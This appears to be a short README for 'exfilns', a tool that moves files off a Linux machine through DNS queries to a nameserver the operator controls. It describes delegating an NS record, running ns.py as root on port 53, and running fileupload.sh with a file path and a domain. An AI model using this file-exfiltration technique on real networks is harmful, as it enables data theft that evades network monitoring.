# exfilns
Setup: 
have a NS record for the domain you want to use pointed to a server you own
As an example, I run exfil.baki.es pointed to a digital ocean droplet

```$ dig +short exfil.baki.es NS
ubuntu-nyc1-01.cloud.baki.es.```

On the server (ubuntu-nyc1-01.cloud.baki.es in the above example) run ns.py with root permissions (to bind to port 53) 

from any Linux machine you should be able to run the fileupload.sh script to upload a file to that server and given the domain being used

With the examples above:
fileupload.sh /path/to/file exfil.baki.es
